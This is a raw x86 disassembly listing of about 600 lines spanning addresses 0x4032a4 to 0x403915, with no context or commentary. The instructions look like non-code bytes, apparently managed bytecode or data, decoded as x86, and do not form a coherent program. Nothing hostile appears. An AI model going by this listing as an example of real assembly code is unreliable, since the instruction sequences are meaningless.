  4032a4:	adc    esi,DWORD PTR [eax]
  4032a6:	add    eax,DWORD PTR [eax]
  4032a8:	add    BYTE PTR ss:[eax],al
  4032ab:	add    BYTE PTR [eax+eax*1],dl
  4032ae:	add    BYTE PTR [ecx],dl
  4032b0:	pop    ss
  4032b1:	jle    0x4032e1
  4032b3:	add    BYTE PTR [eax],al
  4032b5:	add    al,0x6f
  4032b7:	imul   eax,DWORD PTR [eax],0x4d6f0600
  4032bd:	add    BYTE PTR [eax],al
  4032bf:	push   es
  4032c0:	cs or  al,0x7e
  4032c3:	add    BYTE PTR cs:[eax],al
  4032c6:	add    al,0x6f
  4032c8:	jb     0x4032ca
  4032ca:	add    BYTE PTR [esi],al
  4032cc:	sub    edx,DWORD PTR [eax]
  4032ce:	jle    0x4032fe
  4032d0:	add    BYTE PTR [eax],al
  4032d2:	add    al,0x6f
  4032d4:	imul   eax,DWORD PTR [eax],0x6f160600
  4032da:	push   edx
  4032db:	add    BYTE PTR [eax],al
  4032dd:	push   es
  4032de:	or     al,BYTE PTR [esi]
  4032e0:	sub    BYTE PTR [esi+0x0],dl
  4032e3:	add    BYTE PTR [esi],al
  4032e5:	sub    al,BYTE PTR [eax]
  4032e7:	add    BYTE PTR [ebx],bl
  4032e9:	xor    BYTE PTR [ebx],al
  4032eb:	add    BYTE PTR [esi+0x16000000],cl
  4032f1:	add    BYTE PTR [eax],al
  4032f3:	adc    DWORD PTR [eax],ebp
  4032f5:	push   edi
  4032f6:	add    BYTE PTR [eax],al
  4032f8:	push   es
  4032f9:	jae    0x40328e
  4032fb:	add    BYTE PTR [eax],al
  4032fd:	or     cl,BYTE PTR [edx]
  4032ff:	push   es
  403300:	jle    0x403330
  403302:	add    BYTE PTR [eax],al
  403304:	add    al,0x6f
  403306:	jo     0x403308
  403308:	add    BYTE PTR [esi],al
  40330a:	outs   dx,DWORD PTR ds:[esi]
  40330b:	xchg   esp,eax
  40330c:	add    BYTE PTR [eax],al
  40330e:	or     al,BYTE PTR [esi]
  403310:	sub    BYTE PTR [eax+0x0],bl
  403313:	add    BYTE PTR [esi],al
  403315:	outs   dx,DWORD PTR ds:[esi]
  403316:	xchg   ebp,eax
  403317:	add    BYTE PTR [eax],al
  403319:	or     ch,BYTE PTR [eax]
  40331b:	jl     0x40331d
  40331d:	add    BYTE PTR [esi],al
  40331f:	sub    BYTE PTR [esi+0x0],bl
  403322:	add    BYTE PTR [edx],cl
  403324:	jae    0x4032bc
  403326:	add    BYTE PTR [eax],al
  403328:	or     cl,BYTE PTR [ebx]
  40332a:	jle    0x40335a
  40332c:	add    BYTE PTR [eax],al
  40332e:	add    al,0x6f
  403330:	jb     0x403332
  403332:	add    BYTE PTR [esi],al
  403334:	sub    BYTE PTR [eax],bl
  403336:	add    BYTE PTR [eax],al
  403338:	or     ch,BYTE PTR ds:0x977318
  40333e:	add    BYTE PTR [edx],cl
  403340:	or     al,0x8
  403342:	sub    BYTE PTR [eax+0x6f0a0000],bl
  403348:	cdq    
  403349:	add    BYTE PTR [eax],al
  40334b:	or     al,BYTE PTR [edi]
  40334d:	or     BYTE PTR [edi-0x66],ch
  403350:	add    BYTE PTR [eax],al
  403352:	or     al,BYTE PTR [edx]
  403354:	pop    es
  403355:	sub    BYTE PTR [ebx+0xd0a0000],bl
  40335b:	push   es
  40335c:	or     DWORD PTR [esi+0x2e],edi
  40335f:	add    BYTE PTR [eax],al
  403361:	add    al,0x6f
  403363:	push   0x0
  403365:	add    BYTE PTR [esi],al
  403367:	outs   dx,DWORD PTR ds:[esi]
  403368:	pushf  
  403369:	add    BYTE PTR [eax],al
  40336b:	or     dl,BYTE PTR [ebx]
  40336d:	add    al,0x11
  40336f:	add    al,0x28
  403371:	pop    ecx
  403372:	add    BYTE PTR [eax],al
  403374:	push   es
  403375:	fimul  WORD PTR [edx]
  403377:	or     DWORD PTR [esi+eax*1],ebp
  40337a:	or     DWORD PTR [edi+0x27],ebp
  40337d:	add    BYTE PTR [eax],al
  40337f:	or     bl,ah
  403381:	sub    al,BYTE PTR [eax]
  403383:	add    BYTE PTR [ecx],al
  403385:	adc    BYTE PTR [eax],al
  403387:	add    BYTE PTR [edx],al
  403389:	add    BYTE PTR [edi+0x0],ah
  40338c:	sbb    al,0x83
  40338e:	add    BYTE PTR [edx],cl
  403390:	add    BYTE PTR [eax],al
  403392:	add    BYTE PTR [eax],al
  403394:	inc    esi
  403395:	jle    0x4033c5
  403397:	add    BYTE PTR [eax],al
  403399:	add    al,0x6f
  40339b:	ins    BYTE PTR es:[edi],dx
  40339c:	add    BYTE PTR [eax],al
  40339e:	push   es
  40339f:	pop    ss
  4033a0:	xor    eax,DWORD PTR [edx]
  4033a2:	push   ss
  4033a3:	sub    dl,BYTE PTR [edi]
  4033a5:	sub    al,BYTE PTR [edx+0x7e]
  4033a8:	add    BYTE PTR cs:[eax],al
  4033ab:	add    al,0x6f
  4033ad:	outs   dx,BYTE PTR ds:[esi]
  4033ae:	add    BYTE PTR [eax],al
  4033b0:	push   es
  4033b1:	sub    eax,0x172a1602
  4033b6:	sub    bh,BYTE PTR [esi]
  4033b8:	add    ch,BYTE PTR [eax]
  4033ba:	pop    edx
  4033bb:	add    BYTE PTR [eax],al
  4033bd:	push   es
  4033be:	sub    eax,0x637306
  4033c3:	add    BYTE PTR [esi],al
  4033c5:	jp     0x4033f1
  4033c7:	add    BYTE PTR [ebx],bl
  4033c9:	xor    BYTE PTR [ebx],al
  4033cb:	add    BYTE PTR [edi+0x0],dh
  4033ce:	add    BYTE PTR [eax],al
  4033d0:	pop    ss
  4033d1:	add    BYTE PTR [eax],al
  4033d3:	adc    DWORD PTR [esi],edx
  4033d5:	or     dl,BYTE PTR [esi]
  4033d7:	or     eax,DWORD PTR [edx]
  4033d9:	outs   dx,DWORD PTR ds:[esi]
  4033da:	popf   
  4033db:	add    BYTE PTR [eax],al
  4033dd:	or     dl,BYTE PTR [ebx]
  4033df:	add    eax,0x5112d2b
  4033e4:	outs   dx,DWORD PTR ds:[esi]
  4033e5:	sahf   
  4033e6:	add    BYTE PTR [eax],al
  4033e8:	or     cl,BYTE PTR [eax+ecx*1]
  4033eb:	outs   dx,DWORD PTR ds:[esi]
  4033ec:	lahf   
  4033ed:	add    BYTE PTR [eax],al
  4033ef:	or     dl,BYTE PTR [edx]
  4033f1:	add    BYTE PTR [edx],dl
  4033f3:	add    DWORD PTR [eax],ebp
  4033f5:	pop    ebx
  4033f6:	add    BYTE PTR [eax],al
  4033f8:	push   es
  4033f9:	or     eax,0xa02809
  4033fe:	add    BYTE PTR [edx],cl
  403400:	or     BYTE PTR [eax],ch
  403402:	pop    ebp
  403403:	add    BYTE PTR [eax],al
  403405:	push   es
  403406:	adc    eax,DWORD PTR [ecx+edx*1]
  403409:	add    al,0x28
  40340b:	pop    esi
  40340c:	add    BYTE PTR [eax],al
  40340e:	or     dl,BYTE PTR [ecx]
  403410:	add    eax,0x266f
  403415:	or     ch,BYTE PTR ds:0x110cdeca
  40341b:	add    eax,0x511072c
  403420:	outs   dx,DWORD PTR ds:[esi]
  403421:	daa    
  403422:	add    BYTE PTR [eax],al
  403424:	or     bl,ah
  403426:	jle    0x403454
  403428:	add    BYTE PTR [eax],al
  40342a:	add    al,0x6
  40342c:	pop    eax
  40342d:	sub    BYTE PTR [eax+eax*1],0x0
  403431:	add    al,0x7e
  403433:	sub    eax,0x7040000
  403438:	pop    eax
  403439:	sub    BYTE PTR ds:0xde040000,0x6
  403440:	sub    BYTE PTR [edx-0x23f60000],dl
  403446:	pop    es
  403447:	push   ss
  403448:	inc    BYTE PTR [ecx]
  40344a:	sub    al,BYTE PTR [eax]
  40344c:	add    DWORD PTR [eax+eax*1],ebx
  40344f:	add    BYTE PTR [edx],al
  403451:	add    BYTE PTR [eax+eax*1],cl
  403454:	cmp    al,BYTE PTR [esi+0x0]
  403457:	or     al,0x0
  403459:	add    BYTE PTR [eax],al
  40345b:	add    BYTE PTR [edx],al
  40345d:	add    BYTE PTR [eax+eax*1],al
  403460:	push   0x6006c
  403465:	add    BYTE PTR [eax],al
  403467:	add    BYTE PTR [esi+0x2],bh
  40346a:	sub    eax,0x4a250309
  40346f:	pop    ss
  403470:	pop    eax
  403471:	push   esp
  403472:	pop    ds
  403473:	push   cs
  403474:	sub    al,BYTE PTR [edx]
  403476:	pop    ss
  403477:	xor    ecx,DWORD PTR [ecx]
  403479:	add    al,0x25
  40347b:	dec    edx
  40347c:	pop    ss
  40347d:	pop    eax
  40347e:	push   esp
  40347f:	pop    ds
  403480:	or     al,0x2a
  403482:	sub    BYTE PTR [ecx+0x2a0a0000],ah
  403488:	adc    esi,DWORD PTR [eax]
  40348a:	add    al,BYTE PTR [eax]
  40348c:	xor    BYTE PTR [eax],al
  40348e:	add    BYTE PTR [eax],al
  403490:	adc    al,0x0
  403492:	add    BYTE PTR [ecx],dl
  403494:	sub    BYTE PTR [edx+0x280a0000],dl
  40349a:	pop    edi
  40349b:	add    BYTE PTR [eax],al
  40349d:	or     bh,BYTE PTR [esi+0x2d]
  4034a0:	add    BYTE PTR [eax],al
  4034a2:	add    al,0x8c
  4034a4:	pop    esi
  4034a5:	add    BYTE PTR [eax],al
  4034a7:	add    DWORD PTR [esi+0x2c],edi
  4034aa:	add    BYTE PTR [eax],al
  4034ac:	add    al,0x8c
  4034ae:	pop    esi
  4034af:	add    BYTE PTR [eax],al
  4034b1:	add    DWORD PTR [eax],ebp
  4034b3:	jge    0x4034b5
  4034b5:	add    BYTE PTR [esi],al
  4034b7:	or     al,BYTE PTR [esi]
  4034b9:	sub    BYTE PTR [esi+0x0],bl
  4034bc:	add    BYTE PTR [edx],cl
  4034be:	sub    BYTE PTR [edx+0x2a0a0000],dl
  4034c4:	adc    esi,DWORD PTR [eax]
  4034c6:	push   es
  4034c7:	add    BYTE PTR [esi],dh
  4034c9:	add    BYTE PTR [eax],al
  4034cb:	add    BYTE PTR [eax+eax*1],dl
  4034ce:	add    BYTE PTR [ecx],dl
  4034d0:	adc    al,0xa
  4034d2:	add    ch,BYTE PTR [edi-0x5e]
  4034d5:	add    BYTE PTR [eax],al
  4034d7:	or     ch,BYTE PTR [edi+eax*1]
  4034da:	add    ch,BYTE PTR [edi-0x5e]
  4034dd:	add    BYTE PTR [eax],al
  4034df:	or     cl,BYTE PTR [edx]
  4034e1:	push   es
  4034e2:	add    ch,BYTE PTR [edi-0x5d]
  4034e5:	add    BYTE PTR [eax],al
  4034e7:	or     al,BYTE PTR [edx]
  4034e9:	outs   dx,DWORD PTR ds:[esi]
  4034ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4034eb:	add    BYTE PTR [eax],al
  4034ed:	or     al,BYTE PTR [edx]
  4034ef:	outs   dx,DWORD PTR ds:[esi]
  4034f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4034f1:	add    BYTE PTR [eax],al
  4034f3:	or     al,BYTE PTR [edx]
  4034f5:	outs   dx,DWORD PTR ds:[esi]
  4034f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4034f7:	add    BYTE PTR [eax],al
  4034f9:	or     al,BYTE PTR [edx]
  4034fb:	outs   dx,DWORD PTR ds:[esi]
  4034fc:	lahf   
  4034fd:	add    BYTE PTR [eax],al
  4034ff:	or     ch,BYTE PTR [eax]
  403501:	pop    edi
  403502:	add    BYTE PTR [eax],al
  403504:	push   es
  403505:	sub    al,BYTE PTR [eax]
  403507:	add    BYTE PTR [ebx],bl
  403509:	xor    BYTE PTR [esi],al
  40350b:	add    BYTE PTR ds:0x18000000,dh
  403511:	add    BYTE PTR [eax],al
  403513:	adc    DWORD PTR [esi],ecx
  403515:	add    eax,0x2c7f
  40351a:	add    al,0x7f
  40351c:	sub    eax,0x28040000
  403521:	pop    ebx
  403522:	add    BYTE PTR [eax],al
  403524:	push   es
  403525:	or     al,BYTE PTR [esi]
  403527:	sub    BYTE PTR [eax+0x20a0000],ah
  40352d:	add    eax,DWORD PTR [eax*1+0x50e040e]
  403534:	sub    BYTE PTR [edi+0x0],bl
  403537:	add    BYTE PTR [esi],al
  403539:	or     eax,DWORD PTR [edi]
  40353b:	sub    BYTE PTR [esi+0x0],bl
  40353e:	add    BYTE PTR [edx],cl
  403540:	fiadd  WORD PTR [esi]
  403542:	sub    BYTE PTR [edx-0x23f60000],dl
  403548:	sub    al,BYTE PTR [eax]
  40354a:	add    BYTE PTR [eax],al
  40354c:	add    DWORD PTR [eax],edx
  40354e:	add    BYTE PTR [eax],al
  403550:	add    al,BYTE PTR [eax]
  403552:	add    BYTE PTR [eax],al
  403554:	cs add BYTE PTR cs:[esi],al
  403558:	add    BYTE PTR [eax],al
  40355a:	add    BYTE PTR [eax],al
  40355c:	adc    esi,DWORD PTR [eax]
  40355e:	push   es
  40355f:	add    BYTE PTR [eax+eax*1+0x190000],dh
  403566:	add    BYTE PTR [ecx],dl
  403568:	push   cs
  403569:	add    eax,0x245080c
  40356e:	add    BYTE PTR [eax],al
  403570:	add    BYTE PTR [edx],cl
  403572:	add    BYTE PTR [eax],al
  403574:	add    BYTE PTR [edx],al
  403576:	add    BYTE PTR [eax],al
  403578:	add    BYTE PTR [ebx],ch
  40357a:	adc    BYTE PTR [eax],ch
  40357c:	sahf   
  40357d:	add    BYTE PTR [eax],al
  40357f:	push   es
  403580:	or     ebp,DWORD PTR [ebx]
  403582:	push   cs
  403583:	sub    BYTE PTR [edi+0xb060000],bl
  403589:	sub    eax,DWORD PTR [esi]
  40358b:	sub    BYTE PTR [eax+0xb060000],ah
  403591:	add    ch,BYTE PTR ds:0x2f160334
  403597:	xor    BYTE PTR [esi+edx*1],al
  40359a:	das    
  40359b:	sub    al,0x28
  40359d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40359e:	add    BYTE PTR [eax],al
  4035a0:	or     dh,BYTE PTR [edx+0x57]
  4035a3:	add    BYTE PTR [eax],al
  4035a5:	jo     0x4035c0
  4035a7:	lea    eax,[edx]
  4035a9:	add    BYTE PTR [eax],al
  4035ab:	add    DWORD PTR ds:0xa2071609,ecx
  4035b1:	or     DWORD PTR [edi],edx
  4035b3:	push   cs
  4035b4:	add    al,0x8c
  4035b6:	pop    esi
  4035b7:	add    BYTE PTR [eax],al
  4035b9:	add    DWORD PTR [edx-0x5dfae7f7],esp
  4035bf:	or     DWORD PTR [eax],ebp
  4035c1:	test   al,0x0
  4035c3:	add    BYTE PTR [edx],cl
  4035c5:	or     ch,BYTE PTR [ebx]
  4035c7:	push   edx
  4035c8:	sub    BYTE PTR [edi+0x720a0000],ah
  4035ce:	jnp    0x4035d0
  4035d0:	add    BYTE PTR [eax+0x1c],dh
  4035d3:	lea    eax,[edx]
  4035d5:	add    BYTE PTR [eax],al
  4035d7:	add    DWORD PTR [ebx],edx
  4035d9:	add    al,0x11
  4035db:	add    al,0x16
  4035dd:	add    ch,BYTE PTR [ebx+eax*1]
  4035e0:	add    ch,BYTE PTR [ebx]
  4035e2:	add    eax,0xa128
  4035e7:	push   es
  4035e8:	mov    ds:0x3170411,al
  4035ed:	mov    WORD PTR [esi+0x0],ds
  4035f0:	add    BYTE PTR [ecx],al
  4035f2:	mov    ds:0x4180411,al
  4035f7:	mov    WORD PTR [esi+0x0],ds
  4035fa:	add    BYTE PTR [ecx],al
  4035fc:	mov    ds:0x7190411,al
  403601:	mov    ds:0xe1a0411,al
  403606:	add    al,0x8c
  403608:	pop    esi
  403609:	add    BYTE PTR [eax],al
  40360b:	add    DWORD PTR [edx+0x51b0411],esp
  403611:	mov    ds:0xa8280411,al
  403616:	add    BYTE PTR [eax],al
  403618:	or     cl,BYTE PTR [edx]
  40361a:	push   es
  40361b:	sub    dl,BYTE PTR [ebx]
  40361d:	xor    BYTE PTR [ebx],al
  40361f:	add    BYTE PTR [edx+0x0],cl
  403622:	add    BYTE PTR [eax],al
  403624:	sbb    al,BYTE PTR [eax]
  403626:	add    BYTE PTR [ecx],dl
  403628:	add    ch,BYTE PTR [edi-0x6f]
  40362b:	add    BYTE PTR [eax],al
  40362d:	or     cl,BYTE PTR [edx]
  40362f:	push   ss
  403630:	or     eax,DWORD PTR [edx]
  403632:	outs   dx,DWORD PTR ds:[esi]
  403633:	sbb    al,0x0
  403635:	add    BYTE PTR [edx],cl
  403637:	or     al,0x2b
  403639:	xor    eax,DWORD PTR [edi]
  40363b:	pop    ss
  40363c:	pop    eax
  40363d:	or     edi,DWORD PTR [esi+0x44]
  403640:	add    BYTE PTR [eax],al
  403642:	or     al,BYTE PTR [edi]
  403644:	pop    ds
  403645:	or     DWORD PTR [edi-0x57],ebp
  403648:	add    BYTE PTR [eax],al
  40364a:	or     cl,BYTE PTR ds:0xaa2806
  403650:	add    BYTE PTR [edx],cl
  403652:	or     DWORD PTR [eax],ebp
  403654:	stos   DWORD PTR es:[edi],eax
  403655:	add    BYTE PTR [eax],al
  403657:	or     cl,BYTE PTR [edx]
  403659:	push   es
  40365a:	or     BYTE PTR [edi-0x6f],ch
  40365d:	add    BYTE PTR [eax],al
  40365f:	or     ch,BYTE PTR [eax]
  403661:	push   eax
  403662:	add    BYTE PTR [eax],al
  403664:	or     cl,BYTE PTR [edx]
  403666:	or     BYTE PTR [edi+0x1c],ch
  403669:	add    BYTE PTR [eax],al
  40366b:	or     cl,BYTE PTR [eax+ecx*1]
  40366e:	sub    eax,0x2e2a06ca
  403673:	jae    0x4036ee
  403675:	add    BYTE PTR [eax],al
  403677:	push   es
  403678:	sub    BYTE PTR [esi],0x0
  40367b:	add    BYTE PTR [edx+ebp*1],al
  40367e:	push   ds
  40367f:	add    ch,BYTE PTR [eax]
  403681:	sbb    DWORD PTR [eax],eax
  403683:	add    BYTE PTR [edx],cl
  403685:	sub    bl,BYTE PTR [esi]
  403687:	add    ch,BYTE PTR [eax]
  403689:	lods   al,BYTE PTR ds:[esi]
  40368a:	add    BYTE PTR [eax],al
  40368c:	or     ch,BYTE PTR [edx]
  40368e:	mov    es,WORD PTR [ebx]
  403690:	mov    gs,WORD PTR [ecx+0x2d]
  403693:	push   ss
  403694:	add    ch,BYTE PTR [edi+0x23]
  403697:	add    BYTE PTR [eax],al
  403699:	push   es
  40369a:	sub    BYTE PTR [eax+eax*1+0x60200600],dl
  4036a1:	sbb    eax,DWORD PTR [eax]
  4036a3:	add    BYTE PTR [ebx-0x56],dh
  4036a6:	add    BYTE PTR [eax],al
  4036a8:	push   es
  4036a9:	jp     0x4036ad
  4036ab:	add    ebp,DWORD PTR [eax]
  4036ad:	and    DWORD PTR [eax],eax
  4036af:	add    BYTE PTR [esi],al
  4036b1:	sub    ch,BYTE PTR [esi]
  4036b3:	sub    BYTE PTR [ecx],dh
  4036b5:	add    BYTE PTR [eax],al
  4036b7:	push   es
  4036b8:	sub    BYTE PTR [ebx+0x0],bh
  4036bb:	add    BYTE PTR [esi],al
  4036bd:	sub    al,BYTE PTR [eax]
  4036bf:	add    BYTE PTR [ebx],dl
  4036c1:	xor    BYTE PTR [esi],al
  4036c3:	add    BYTE PTR [eax+eax*1+0x0],dl
  4036c7:	add    BYTE PTR [ebx],bl
  4036c9:	add    BYTE PTR [eax],al
  4036cb:	adc    DWORD PTR [ecx],ebx
  4036cd:	lea    ecx,[edx]
  4036cf:	add    BYTE PTR [eax],al
  4036d1:	add    cl,BYTE PTR [edx]
  4036d3:	push   es
  4036d4:	push   ss
  4036d5:	sub    BYTE PTR [edi+0x14060000],cl
  4036db:	inc    BYTE PTR [esi]
  4036dd:	mov    es,WORD PTR [eax]
  4036df:	add    BYTE PTR [esi],al
  4036e1:	jae    0x403690
  4036e3:	add    BYTE PTR [eax],al
  4036e5:	or     dh,BYTE PTR [ebx+0x45]
  4036e8:	add    BYTE PTR [eax],al
  4036ea:	push   es
  4036eb:	mov    ds:0x91281706,al
  4036f0:	add    BYTE PTR [eax],al
  4036f2:	push   es
  4036f3:	adc    al,0xfe
  4036f5:	push   es
  4036f6:	nop
  4036f7:	add    BYTE PTR [eax],al
  4036f9:	push   es
  4036fa:	jae    0x4036a9
  4036fc:	add    BYTE PTR [eax],al
  4036fe:	or     dh,BYTE PTR [ebx+0x45]
  403701:	add    BYTE PTR [eax],al
  403703:	push   es
  403704:	mov    ds:0x93281806,al
  403709:	add    BYTE PTR [eax],al
  40370b:	push   es
  40370c:	adc    al,0xfe
  40370e:	push   es
  40370f:	xchg   edx,eax
  403710:	add    BYTE PTR [eax],al
  403712:	push   es
  403713:	jae    0x4036c2
  403715:	add    BYTE PTR [eax],al
  403717:	or     dh,BYTE PTR [ebx+0x45]
  40371a:	add    BYTE PTR [eax],al
  40371c:	push   es
  40371d:	mov    ds:0x286a2a06,al
  403722:	xor    DWORD PTR [eax],eax
  403724:	add    BYTE PTR [esi],al
  403726:	sub    BYTE PTR [edx],dh
  403728:	add    BYTE PTR [eax],al
  40372a:	push   es
  40372b:	sub    BYTE PTR [edx+0x0],bh
  40372e:	add    BYTE PTR [esi],al
  403730:	sub    BYTE PTR [esi+0x0],bl
  403733:	add    BYTE PTR [edx],cl
  403735:	sub    BYTE PTR [edi+0x0],bl
  403738:	add    BYTE PTR [edx],cl
  40373a:	sub    bl,BYTE PTR [esi]
  40373c:	add    bh,BYTE PTR [ebx+0x54]
  40373f:	add    BYTE PTR [eax],al
  403741:	add    al,0x2a
  403743:	push   ds
  403744:	add    bh,BYTE PTR [ebx+0x57]
  403747:	add    BYTE PTR [eax],al
  403749:	add    al,0x2a
  40374b:	push   ds
  40374c:	add    bh,BYTE PTR [ebx+0x58]
  40374f:	add    BYTE PTR [eax],al
  403751:	add    al,0x2a
  403753:	add    BYTE PTR [edx],0x72
  403756:	mov    ebp,0x3700000
  40375b:	sub    BYTE PTR [eax+0x0],bh
  40375e:	add    BYTE PTR [esi],al
  403760:	add    dh,BYTE PTR [edx-0x43]
  403763:	add    BYTE PTR [eax],al
  403765:	jo     0x40376a
  403767:	sub    BYTE PTR [edi+0x0],dh
  40376a:	add    BYTE PTR [esi],al
  40376c:	add    al,BYTE PTR [ebx]
  40376e:	jge    0x4037c8
  403770:	add    BYTE PTR [eax],al
  403772:	add    al,0x2a
  403774:	push   ds
  403775:	add    bh,BYTE PTR [ebx+0x59]
  403778:	add    BYTE PTR [eax],al
  40377a:	add    al,0x2a
  40377c:	and    al,BYTE PTR [edx]
  40377e:	add    edi,DWORD PTR [ebp+0x59]
  403781:	add    BYTE PTR [eax],al
  403783:	add    al,0x2a
  403785:	push   ds
  403786:	add    bh,BYTE PTR [ebx+0x5b]
  403789:	add    BYTE PTR [eax],al
  40378b:	add    al,0x2a
  40378d:	and    al,BYTE PTR [edx]
  40378f:	add    edi,DWORD PTR [ebp+0x5b]
  403792:	add    BYTE PTR [eax],al
  403794:	add    al,0x2a
  403796:	push   ds
  403797:	add    bh,BYTE PTR [ebx+0x5a]
  40379a:	add    BYTE PTR [eax],al
  40379c:	add    al,0x2a
  40379e:	and    al,BYTE PTR [edx]
  4037a0:	add    edi,DWORD PTR [ebp+0x5a]
  4037a3:	add    BYTE PTR [eax],al
  4037a5:	add    al,0x2a
  4037a7:	adc    BYTE PTR [edx+eax*1],0x7b
  4037ab:	push   esi
  4037ac:	add    BYTE PTR [eax],al
  4037ae:	add    al,0x28
  4037b0:	scas   al,BYTE PTR es:[edi]
  4037b1:	add    BYTE PTR [eax],al
  4037b3:	or     ch,BYTE PTR ds:0x447e06
  4037b9:	add    BYTE PTR [edx],cl
  4037bb:	sub    al,BYTE PTR [edx]
  4037bd:	jnp    0x403815
  4037bf:	add    BYTE PTR [eax],al
  4037c1:	add    al,0x6f
  4037c3:	and    al,0x0
  4037c5:	add    BYTE PTR [edx],cl
  4037c7:	sub    dl,BYTE PTR [ebx]
  4037c9:	xor    BYTE PTR [ebx],al
  4037cb:	add    BYTE PTR [edx],bl
  4037cd:	add    BYTE PTR [eax],al
  4037cf:	add    BYTE PTR [eax+eax*1],bl
  4037d2:	add    BYTE PTR [ecx],dl
  4037d4:	add    edx,DWORD PTR [esi]
  4037d6:	jae    0x403787
  4037d8:	add    BYTE PTR [eax],al
  4037da:	or     cl,BYTE PTR [edx]
  4037dc:	add    al,BYTE PTR [esi]
  4037de:	jae    0x403790
  4037e0:	add    BYTE PTR [eax],al
  4037e2:	or     ch,BYTE PTR [eax]
  4037e4:	mov    cl,0x0
  4037e6:	add    BYTE PTR [edx],cl
  4037e8:	jge    0x403840
  4037ea:	add    BYTE PTR [eax],al
  4037ec:	add    al,0x2a
  4037ee:	add    BYTE PTR [eax],al
  4037f0:	adc    esi,DWORD PTR [eax]
  4037f2:	add    al,0x0
  4037f4:	mov    esp,0x1d000000
  4037f9:	add    BYTE PTR [eax],al
  4037fb:	adc    DWORD PTR [edx],eax
  4037fd:	sub    BYTE PTR [eax+0x0],ch
  403800:	add    BYTE PTR [esi],al
  403802:	or     eax,DWORD PTR [edi]
  403804:	sbb    eax,DWORD PTR [eax-0x71]
  403807:	add    BYTE PTR [eax],al
  403809:	add    BYTE PTR [edx],al
  40380b:	sub    BYTE PTR [edx+0x0],dh
  40380e:	add    BYTE PTR [esi],al
  403810:	sub    BYTE PTR [eax],bl
  403812:	add    BYTE PTR [eax],al
  403814:	or     ch,BYTE PTR ds:0x6928021d
  40381a:	add    BYTE PTR [eax],al
  40381c:	push   es
  40381d:	outs   dx,DWORD PTR ds:[esi]
  40381e:	dec    ebp
  40381f:	add    BYTE PTR [eax],al
  403821:	push   es
  403822:	sub    al,0x26
  403824:	sub    BYTE PTR [eax+eax*1+0x6f200600],ah
  40382b:	sbb    eax,DWORD PTR [eax]
  40382d:	add    BYTE PTR [ebx-0x56],dh
  403830:	add    BYTE PTR [eax],al
  403832:	push   es
  403833:	jp     0x403837
  403835:	add    ch,BYTE PTR [eax]
  403837:	imul   eax,DWORD PTR [eax],0xc5720600
  40383d:	add    BYTE PTR [eax],al
  40383f:	jo     0x4038b3
  403841:	retf   
  403842:	add    BYTE PTR [eax],al
  403844:	jo     0x40386e
  403846:	jne    0x403848
  403848:	add    BYTE PTR [esi],al
  40384a:	add    ch,BYTE PTR [eax]
  40384c:	daa    
  40384d:	add    BYTE PTR [eax],al
  40384f:	push   es
  403850:	jb     0x40380f
  403852:	add    BYTE PTR [eax],al
  403854:	jo     0x4038c5
  403856:	cmp    BYTE PTR [eax],al
  403858:	add    BYTE PTR [edx],cl
  40385a:	or     al,BYTE PTR [esi]
  40385c:	outs   dx,DWORD PTR ds:[esi]
  40385d:	or     eax,0x2d060000
  403862:	push   ss
  403863:	push   es
  403864:	outs   dx,DWORD PTR ds:[esi]
  403865:	pop    ss
  403866:	add    BYTE PTR [eax],al
  403868:	push   es
  403869:	sub    BYTE PTR [ecx+0x20060000],bl
  40386f:	pop    esp
  403870:	sbb    eax,DWORD PTR [eax]
  403872:	add    BYTE PTR [ebx-0x56],dh
  403875:	add    BYTE PTR [eax],al
  403877:	push   es
  403878:	jp     0x40387c
  40387a:	sub    BYTE PTR [eax+0x0],dh
  40387d:	add    BYTE PTR [esi],al
  40387f:	sub    al,0x18
  403881:	add    ch,BYTE PTR [eax]
  403883:	outs   dx,BYTE PTR ds:[esi]
  403884:	add    BYTE PTR [eax],al
  403886:	push   es
  403887:	sub    eax,0xa52810
  40388c:	add    BYTE PTR [esi],al
  40388e:	and    BYTE PTR [ecx+0x1b],dh
  403891:	add    BYTE PTR [eax],al
  403893:	jae    0x40383f
  403895:	add    BYTE PTR [eax],al
  403897:	push   es
  403898:	jp     0x40389c
  40389a:	jnp    0x4038f1
  40389c:	add    BYTE PTR [eax],al
  40389e:	add    al,0x2d
  4038a0:	push   ss
  4038a1:	add    al,BYTE PTR [edx]
  4038a3:	jb     0x40387c
  4038a5:	add    BYTE PTR [eax],al
  4038a7:	jo     0x40391b
  4038a9:	or     DWORD PTR [ecx],eax
  4038ab:	add    BYTE PTR [eax+0x28],dh
  4038ae:	jbe    0x4038b0
  4038b0:	add    BYTE PTR [esi],al
  4038b2:	jge    0x403909
  4038b4:	add    BYTE PTR [eax],al
  4038b6:	add    al,0x2a
  4038b8:	add    esi,DWORD PTR [eax]
  4038ba:	add    eax,DWORD PTR [eax]
  4038bc:	inc    ecx
  4038bd:	add    BYTE PTR [eax],al
  4038bf:	add    BYTE PTR [eax],al
  4038c1:	add    BYTE PTR [eax],al
  4038c3:	add    BYTE PTR [ebx],al
  4038c5:	outs   dx,DWORD PTR ds:[esi]
  4038c6:	das    
  4038c7:	add    BYTE PTR [eax],al
  4038c9:	or     ch,BYTE PTR ds:0x28050412
  4038cf:	mov    ds:0x20060000,al
  4038d4:	arpl   WORD PTR [ebx],bx
  4038d6:	add    BYTE PTR [eax],al
  4038d8:	jae    0x403884
  4038da:	add    BYTE PTR [eax],al
  4038dc:	push   es
  4038dd:	jp     0x4038e2
  4038df:	outs   dx,DWORD PTR ds:[esi]
  4038e0:	das    
  4038e1:	add    BYTE PTR [eax],al
  4038e3:	or     dl,BYTE PTR [edi]
  4038e5:	cs sbb eax,0x2f6f0304
  4038eb:	add    BYTE PTR [eax],al
  4038ed:	or     cl,BYTE PTR [esi+ebx*2+0x5010000]
  4038f4:	sub    BYTE PTR [ebx+0x20060000],ah
  4038fa:	sbb    eax,DWORD PTR fs:[eax]
  4038fd:	add    BYTE PTR [ebx-0x56],dh
  403900:	add    BYTE PTR [eax],al
  403902:	push   es
  403903:	jp     0x40392f
  403905:	add    BYTE PTR [eax],al
  403907:	add    BYTE PTR [ebx],dl
  403909:	xor    BYTE PTR [edx],al
  40390b:	add    BYTE PTR [edx],bl
  40390d:	add    BYTE PTR [eax],al
  40390f:	add    BYTE PTR [ebx],dl
  403911:	add    BYTE PTR [eax],al
  403913:	adc    DWORD PTR [eax],ebp
  403915:	mov    dl,0x0
